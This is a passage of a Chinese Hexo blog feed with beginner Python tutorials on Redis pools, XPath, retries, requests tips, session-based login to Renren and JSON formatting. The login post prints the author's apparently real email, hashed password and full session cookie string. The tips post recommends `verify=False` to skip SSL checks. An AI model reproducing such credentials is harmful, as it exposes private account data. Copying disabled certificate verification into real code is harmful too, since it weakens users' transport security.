<li>普通连接池<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@dana:~/python-excercise<span class="comment"># cat redis-pool-practice.py</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">6379</span>)</span><br><span class="line">r = redis.Redis(connection_pool=pool)</span><br><span class="line">r.<span class="built_in">set</span>(<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;16&#x27;</span>) <span class="comment">#设置键值对</span></span><br><span class="line"><span class="built_in">print</span>(r.get(<span class="string">&#x27;age&#x27;</span>)) <span class="comment">#获取键的值</span></span><br></pre></td></tr></table></figure></li>
<li>StrictRedis连接池<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@dana:~/python-excercise<span class="comment"># cat redis-pool-strictredis-practice.py</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">&#x27;192.168.80.17&#x27;</span>,port=<span class="number">6379</span>)</span><br><span class="line">r = redis.StrictRedis(connection_pool=pool)</span><br><span class="line">r.<span class="built_in">set</span>(<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.get(<span class="string">&#x27;age&#x27;</span>))</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.cnblogs.com/wang-yc/p/5693288.html">https://www.cnblogs.com/wang-yc/p/5693288.html</a></p>
]]></content>
      <categories>
        <category>redis数据库</category>
      </categories>
      <tags>
        <tag>python和redis的交互</tag>
        <tag>redis数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之Xpath使用</title>
    <url>//posts/ZH-CN/Python_Spider_Xpath_Usage.html</url>
    <content><![CDATA[<h2 id="xpath是什么"><a href="#xpath是什么" class="headerlink" title="xpath是什么"></a>xpath是什么</h2><p>XPath (XML Path Language) 是一门在 HTML\XML 文档中查找信息的语言，可用来在 HTML\XML 文档中对元素和属性进行遍历。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="xpath练习"><a href="#xpath练习" class="headerlink" title="xpath练习"></a>xpath练习</h2><p>标签定位，取属性值<br>举例：用法还算简单，使用Xpath Helper练习XPath语法。无非就是定位标签，获取属性值或者文本内容。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb40vyysbfj31f60u0av4.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb456u2xecj31f60u079l.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb45cuxeo4j31f60u0af8.jpg" alt="image.png"></p>
<h2 id="应用场景-将提取数据对应组成字典"><a href="#应用场景-将提取数据对应组成字典" class="headerlink" title="应用场景-将提取数据对应组成字典"></a>应用场景-将提取数据对应组成字典</h2><p>比如我需要把每部电影的title和region对应起来组成一个字典，可以这样做。</p>
<ul>
<li>用etree方法把html转换为element对象</li>
<li>用xpath对这个element对象进行分组，分组的结果也是一个element对象</li>
<li>对element对象进行遍历，获取title和region这两个字段的数据，就对这个element对象做xpath。这样可以确保字典的对应关系是正确的。<br>代码：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree <span class="comment">#导入lxml模块的etree库</span></span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;ul class=&quot;lists&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;li id=&quot;26871938&quot; class=&quot;list-item&quot; data-title=&quot;灭绝&quot; data-score=&quot;5.6&quot; data-star=&quot;30&quot; data-release=&quot;2018&quot; data-duration=&quot;93分钟(中国大陆)&quot; data-region=&quot;美国&quot; data-director=&quot;本·扬&quot; data-actors=&quot;迈克尔·佩纳 / 丽兹·卡潘 / 伊瑟尔·布罗萨德&quot; data-category=&quot;nowplaying&quot; data-enough=&quot;True&quot; data-showed=&quot;True&quot; data-votecount=&quot;7958&quot; data-subject=&quot;26871938&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;poster&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;https://movie.douban.com/subject/26871938/?from=playing_poster&quot; class=&quot;ticket-btn&quot; target=&quot;_blank&quot; data-psource=&quot;poster&quot;&gt;</span></span><br><span class="line"><span class="string">                                    &lt;img src=&quot;https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2579512247.webp&quot; alt=&quot;灭绝&quot; rel=&quot;nofollow&quot; class=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;stitle&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;https://movie.douban.com/subject/26871938/?from=playing_poster&quot; class=&quot;ticket-btn&quot; target=&quot;_blank&quot; title=&quot;灭绝&quot; data-psource=&quot;title&quot;&gt;</span></span><br><span class="line"><span class="string">                                    灭绝</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;srating&quot;&gt;</span></span><br><span class="line"><span class="string">                                        &lt;span class=&quot;rating-star allstar30&quot;&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                        &lt;span class=&quot;subject-rate&quot;&gt;5.6&lt;/span&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                                &lt;li class=&quot;sbtn&quot;&gt;</span></span><br><span class="line"><span class="string">                                    &lt;a class=&quot;ticket-btn&quot; href=&quot;https://movie.douban.com/ticket/redirect/?movie_id=26871938&quot; target=&quot;_blank&quot;&gt;</span></span><br><span class="line"><span class="string">                                        选座购票</span></span><br><span class="line"><span class="string">                                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                                &lt;/li&gt;</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li id=&quot;25842038&quot; class=&quot;list-item&quot; data-title=&quot;理查德·朱维尔的哀歌&quot; data-score=&quot;8.3&quot; data-star=&quot;45&quot; data-release=&quot;2019&quot; data-duration=&quot;131分钟&quot; data-region=&quot;美国&quot; data-director=&quot;克林特·伊斯特伍德&quot; data-actors=&quot;保罗·沃尔特·豪泽 / 山姆·洛克威尔 / 奥利维亚·王尔德&quot; data-category=&quot;nowplaying&quot; data-enough=&quot;True&quot; data-showed=&quot;True&quot; data-votecount=&quot;24174&quot; data-subject=&quot;25842038&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;poster&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;https://movie.douban.com/subject/25842038/?from=playing_poster&quot; class=&quot;ticket-btn&quot; target=&quot;_blank&quot; data-psource=&quot;poster&quot;&gt;</span></span><br><span class="line"><span class="string">                                    &lt;img src=&quot;https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2578705064.webp&quot; alt=&quot;理查德·朱维尔的哀歌&quot; rel=&quot;nofollow&quot; class=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;stitle&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;https://movie.douban.com/subject/25842038/?from=playing_poster&quot; class=&quot;ticket-btn&quot; target=&quot;_blank&quot; title=&quot;理查德·朱维尔的哀歌&quot; data-psource=&quot;title&quot;&gt;</span></span><br><span class="line"><span class="string">                                    理查德·朱维尔...</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;srating&quot;&gt;</span></span><br><span class="line"><span class="string">                                        &lt;span class=&quot;rating-star allstar45&quot;&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                        &lt;span class=&quot;subject-rate&quot;&gt;8.3&lt;/span&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                                &lt;li class=&quot;sbtn&quot;&gt;</span></span><br><span class="line"><span class="string">                                    &lt;a class=&quot;ticket-btn&quot; href=&quot;https://movie.douban.com/ticket/redirect/?movie_id=25842038&quot; target=&quot;_blank&quot;&gt;</span></span><br><span class="line"><span class="string">                                        选座购票</span></span><br><span class="line"><span class="string">                                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                                &lt;/li&gt;</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li id=&quot;30176393&quot; class=&quot;list-item&quot; data-title=&quot;误杀&quot; data-score=&quot;7.7&quot; data-star=&quot;40&quot; data-release=&quot;2019&quot; data-duration=&quot;112分钟&quot; data-region=&quot;中国大陆&quot; data-director=&quot;柯汶利&quot; data-actors=&quot;肖央 / 谭卓 / 陈冲&quot; data-category=&quot;nowplaying&quot; data-enough=&quot;True&quot; data-showed=&quot;True&quot; data-votecount=&quot;363824&quot; data-subject=&quot;30176393&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;poster&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;https://movie.douban.com/subject/30176393/?from=playing_poster&quot; class=&quot;ticket-btn&quot; target=&quot;_blank&quot; data-psource=&quot;poster&quot;&gt;</span></span><br><span class="line"><span class="string">                                    &lt;img src=&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2576090251.webp&quot; alt=&quot;误杀&quot; rel=&quot;nofollow&quot; class=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                           &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;stitle&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;https://movie.douban.com/subject/30176393/?from=playing_poster&quot; class=&quot;ticket-btn&quot; target=&quot;_blank&quot; title=&quot;误杀&quot; data-psource=&quot;title&quot;&gt;</span></span><br><span class="line"><span class="string">                                    误杀</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"><span class="comment"># print(html) #结果是elment对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># html_str = etree.tostring(html).decode() #自动修正html代码。假设我漏写了其中一个&lt;/li&gt;，这个方法会帮我们补全标签</span></span><br><span class="line"><span class="comment"># print(html_str)</span></span><br><span class="line"></span><br><span class="line">title = html.xpath(<span class="string">&quot;//li[@class=&#x27;list-item&#x27;]/@data-title&quot;</span>)</span><br><span class="line">region = html.xpath(<span class="string">&quot;//li[@class=&#x27;list-item&#x27;]/@data-region&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(title)</span><br><span class="line"><span class="built_in">print</span>(region)</span><br><span class="line"></span><br><span class="line">grp = html.xpath(<span class="string">&quot;//li[@class=&#x27;list-item&#x27;]&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(grp) <span class="comment">#这是个element对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> grp: <span class="comment">#遍历elment对象，将title和region这两个列表组成字典</span></span><br><span class="line">    item = &#123;&#125; <span class="comment">#创建空字典，用于填充数据</span></span><br><span class="line">    item[<span class="string">&quot;title&quot;</span>] = i.xpath(<span class="string">&quot;./@data-title&quot;</span>)</span><br><span class="line">    item[<span class="string">&quot;region&quot;</span>] = i.xpath(<span class="string">&quot;./@data-region&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>lxml模块的<code>etree.HTML</code>这个方法可以把html转换为element对象，我们可以对element对象使用xpath提取数据。</li>
<li>把element对象分组再xpath这种方式（第一次xpath：把element对象分成更小的element对象；第二次xpath：从element对象中提取目标数据），可以帮助我们组成一个对应关系完全正确的字典</li>
</ul>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>XPath使用</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之retry装饰器和timeout设置</title>
    <url>//posts/ZH-CN/Python_Spider_Retry_Timeout.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>爬取url序列时，难免出现部分url请求超时。我们可以设置requests模块发送请求的timeout时间，超过timeout就停止等待。设置这个timeout，就是防止requests傻等，不让它吊死在一棵树上，还有大片森林等着它呢—-<br>我们手动访问url时，如果出现访问超时了，我们一般会刷新网站。不抛弃不放弃，是我们冲浪的基本准则~~<br>python语言，也有类似的做法，使用retrying模块的retry装饰器，就可以达到刷新的效果。（即：程序抛出异常后，发送多次url请求）</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>我们需要用到retry装饰器，达到重发请求的目的。首先得安装retrying模块,安装方法：<code>pip3 install retrying</code></p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry <span class="comment">#引用retrying模块的retry装饰器</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@retry(<span class="params">stop_max_attempt_number=<span class="number">3</span></span>) </span><span class="comment">#retry装饰器：stop_max_attempt_number这个参数表示捕获到程序异常之后，重试的次数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">20</span>) <span class="comment">#这里打印输出*，输出了多少行*，就说明retry装饰器帮助我们发送了多少次请求</span></span><br><span class="line">    response = requests.get(url,headers=headers,timeout=<span class="number">5</span>) <span class="comment">#这里设置的超时时间是5秒。如果这条请求，等了5秒还没有响应，就不等了</span></span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span> <span class="comment">#这里设置了断言，如果响应码不等于200，就会抛出异常</span></span><br><span class="line">    <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>: <span class="comment">#捕获异常</span></span><br><span class="line">        html_str = _parse_url(url)        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        html_str = <span class="literal">None</span> <span class="comment">#如果抛出异常（这里的异常，指的是retry装饰器重试之后，仍然出现异常），就把html_str设置为None</span></span><br><span class="line">    <span class="keyword">return</span> html_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">    html_str = parse_url(url)</span><br><span class="line">    <span class="built_in">print</span>(html_str)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个代码的主要思想就是，对异常的判断，分了两步：初级异常出现，retry装饰器帮我们重发请求，如果重发3次请求，异常还是存在，就进入终极异常。触发异常的根本条件是<strong>请求的响应状态码不等于200</strong></p>
<ul>
<li>第一步，请求的响应状态码不等于200，这时触发<code>初级异常</code>，retry装饰器帮我们重试，最多重发3次请求（因为我设置的重试次数是3）</li>
<li>第二步，retry装饰器重试3次之后，请求的响应状态码仍然不等于200，这时触发<code>终极异常</code>，将请求失败的url响应html设置为None</li>
</ul>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>retry装饰器</tag>
        <tag>requests模块timeout设置</tag>
        <tag>assert断言</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之requests使用小技巧</title>
    <url>//posts/ZH-CN/Python_Spider_Requests_Skills.html</url>
    <content><![CDATA[<h2 id="cookies对象转为字典"><a href="#cookies对象转为字典" class="headerlink" title="cookies对象转为字典"></a>cookies对象转为字典</h2><p>把cookies对象转为字典：<code>requests.utils.dict_from_cookiejar</code><br>把字典转为cookies对象：<code>requests.utils.cookiejar_from_dict</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb127vv0fcj316s08zwfo.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb129rav33j316o0483z5.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="跳过SSL验证"><a href="#跳过SSL验证" class="headerlink" title="跳过SSL验证"></a>跳过SSL验证</h2><p>有些网站虽然是使用https方式访问，但是使用的证书无效。这种情况下，requests库发送的get请求出现报错：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb12dtdr5rj316y0ee76c.jpg" alt="image.png"><br>解决方法就是跳过SSL验证，加一个参数<code>verify=False</code>就行了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb12gf2etnj316a05jwfd.jpg" alt="image.png"></p>
<h2 id="url编解码"><a href="#url编解码" class="headerlink" title="url编解码"></a>url编解码</h2><p>给url解码：<code>requests.utils.unquote</code><br>给url编码：<code>requests.utils.quote</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb12m7dxxhj317408vmzj.jpg" alt="image.png"></p>
<h2 id="设置超时"><a href="#设置超时" class="headerlink" title="设置超时"></a>设置超时</h2><ul>
<li><code>response = requests.get(url,timeout=10)</code></li>
<li>retrying模块<br>  安装retrying模块：pip3 install retrying<br>这部分留到明天继续了……今天花了一天时间复习-————-</li>
</ul>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>requests小技巧</tag>
        <tag>cookies对象转为字典</tag>
        <tag>跳过SSL验证</tag>
        <tag>url编解码</tag>
        <tag>设置请求超时</tag>
        <tag>设置断言</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之使用session发送请求-抓取登录后的页面</title>
    <url>//posts/ZH-CN/Python_Spider_Session_Login.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把人人网的个人主页爬取到本地。注册个人人网先~难得找到这样简单登录方式的网站，只需要输入用户名和密码。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>为了获取登录之后的页面，我们必须发送带有cookies的请求。<br>用法：</p>
<ul>
<li>实例化一个session对象</li>
<li>让session发送get或者post请求</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">response = session.get(url,headers)</span><br></pre></td></tr></table></figure>

<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session() <span class="comment">#实例化sesssion类</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;3321647547@qq.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;key_id&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;captcha_type&quot;</span>:<span class="string">&quot;web_login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;77badfdb18634f82f4c27d9f7c2fee561a5167d23858e99ae7c7c4a63d53474e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;rkey&quot;</span>:<span class="string">&quot;33ce5d635f3ff6984d4952d303196766&quot;</span></span><br><span class="line">        &#125; <span class="comment">#登录请求所必需的post数据</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/ajaxLogin/login&quot;</span> <span class="comment">#点击登录发起的请求url</span></span><br><span class="line"></span><br><span class="line">session.post(url,headers=headers,data=data) <span class="comment">#使用session发送post请求，cookie保存在session里面</span></span><br><span class="line"></span><br><span class="line">my_url = <span class="string">&quot;http://www.renren.com/973482150/profile&quot;</span> <span class="comment">#个人主页。登录后才能够访问</span></span><br><span class="line">r = session.get(my_url,headers=headers) <span class="comment">#此时用这个session发送get请求，就可以保持登录状态，直接访问个人主页</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;renren_profile.html&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#将响应数据写入本地</span></span><br><span class="line">    f.write(r.content.decode())</span><br></pre></td></tr></table></figure>
<p>效果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb113lrs0rj31f60su7wh.jpg" alt="image.png"></p>
<h2 id="吐个槽"><a href="#吐个槽" class="headerlink" title="吐个槽"></a>吐个槽</h2><p>这个网站确实不太行，无法直接点击注册。我是用QQ登录的，登录进去修改密码，才可以使用用户名密码这种登录方式……</p>
<h2 id="使用cookie抓取个人主页"><a href="#使用cookie抓取个人主页" class="headerlink" title="使用cookie抓取个人主页"></a>使用cookie抓取个人主页</h2><p>还可以直接使用登录后的cookie，由requests库发送get请求抓取个人主页。前提是这个网站的cookie过期时间够长，cookie过期了就没戏。<br>有两种方法：<br>    - 在get方法中设置cookies参数，cookies为字典格式（以下代码用了设置cookies参数的方法）<br>    - 在headers中添加cookies的键值对，cookies为字符串<br>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">cookies = <span class="string">&quot;JSESSIONID=abcfPuhawk64MhQgDK4_w; anonymid=k5jjy9gb-p4f3be; depovince=SC; _r01_=1; taihe_bi_sdk_uid=41402119b11006539defa847b6465809; taihe_bi_sdk_session=c04acc71f9216e7983489d1dcf2ad3c1; ick_login=ffaf6e04-f058-459c-8b5c-975cfe140f36; springskin=set; jebe_key=538aac78-0044-476f-980c-0e53071b02d6%7C42d7b478811716336baa94c4523e9833%7C1579351511075%7C1%7C1579351510136; jebe_key=538aac78-0044-476f-980c-0e53071b02d6%7C42d7b478811716336baa94c4523e9833%7C1579351511075%7C1%7C1579351510138; vip=1; wp_fold=0; __utma=151146938.1215165037.1579351626.1579351626.1579351626.1; __utmc=151146938; __utmz=151146938.1579351626.1.1.utmcsr=mail.qq.com|utmccn=(referral)|utmcmd=referral|utmcct=/; ick=4d7cf42c-526e-4a82-baac-d9891e7f89bc; first_login_flag=1; ln_uact=3321647547@qq.com; ln_hurl=http://hdn.xnimg.cn/photos/hdn221/20200118/2045/h_main_TCCN_9c6c00011d14195a.jpg; jebecookies=92ee8c5d-b2ed-4d44-9998-03fc28212dca|||||; _de=04F2D88119EA2B63E16F2C7283EEE4526DEBB8C2103DE356; p=cec0ea11946dbbcf95fd2ce1f2e632ae0; t=7a2144f5aba19975660213d3701d7ec30; societyguester=7a2144f5aba19975660213d3701d7ec30; id=973482150; xnsid=4743cec2; ver=7.0; loginfrom=null&quot;</span></span><br><span class="line">cookies = &#123;i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]:i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookies.split(<span class="string">&quot;; &quot;</span>)&#125; <span class="comment">#字典推导式。把字符串转为字典格式</span></span><br><span class="line"><span class="built_in">print</span>(cookies)</span><br><span class="line"></span><br><span class="line">my_url = <span class="string">&quot;http://www.renren.com/973482150/profile&quot;</span> <span class="comment">#个人主页地址</span></span><br><span class="line">r = requests.get(my_url,headers=headers,cookies=cookies) <span class="comment">#get方法，加上参数cookies就行了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;renren_profile_cookie.html&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.content.decode())</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要抓取登录后的页面，要么使用session类做会话保持，要么使用未过期的cookie并且赶在cookie过期之前完成数据抓取。还有更高阶的方法，写两个程序，一个程序专门获取cookie，另一个程序专门发送请求抓取页面，现阶段只了解一下方法。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>requests的session类</tag>
        <tag>抓取登录后的页面</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之处理json格式的数据</title>
    <url>//posts/ZH-CN/Python_Spider_Json.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>爬取豆瓣手机版【英美剧】类别，将爬取结果保存为美观的json格式。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><ul>
<li>获取url</li>
<li>发送请求，获取响应</li>
<li>格式化并保存数据</li>
</ul>
<h3 id="获取url"><a href="#获取url" class="headerlink" title="获取url"></a>获取url</h3><p>找到能获取目标数据的url，这个url返回响应内容是json格式。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb436g5nmjj31f60u0tdh.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb438yn6nej31f60u0q81.jpg" alt="image.png"></p>
<h3 id="发送请求，获取响应"><a href="#发送请求，获取响应" class="headerlink" title="发送请求，获取响应"></a>发送请求，获取响应</h3><p>使用requests模块发送请求，除了需要带上User-Agent参数，还必须带上Referer参数，否则无法获取响应数据。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb43bweaj8j317l0cpjt0.jpg" alt="image.png"></p>
<h3 id="格式化并保存数据"><a href="#格式化并保存数据" class="headerlink" title="格式化并保存数据"></a>格式化并保存数据</h3><p><code>json.loads</code>将获取的响应数据（json字符串类型）转换为python数据类型，再使用<code>json.dumps</code>将python数据类型转换为字符串类型，写入文件并保存到本地。<br>这个过程就是：字符串——<code>json.loads</code>——python数据类型——<code>json.dumps格式化</code>——将美化后的json字符串保存到本地<br>没错，就是把字符串转为python数据再转为字符串。为什么要兜圈子，直接把获取到的字符串类型的响应数据写入文件保存多简单啊！这样兜圈子当然是有用的，我们使用<code>json.dumps</code>，能够对字符串做美化，使得保存结果更美观。所以说，美是需要付出努力的~<br>json.dumps加上参数<code>ensure_ascii=False</code>能够正常显示中文，加上参数<code>indent</code>可以设置缩进，显示效果对人类的眼球更友好。<br>最后的效果是酱紫的。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb43ubdz1tj31f60u040m.jpg" alt="image.png"><br>对比一下，直接把响应数据写入保存，是啥样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb43wf5hgdj31f60u0qbx.jpg" alt="image.png"></p>
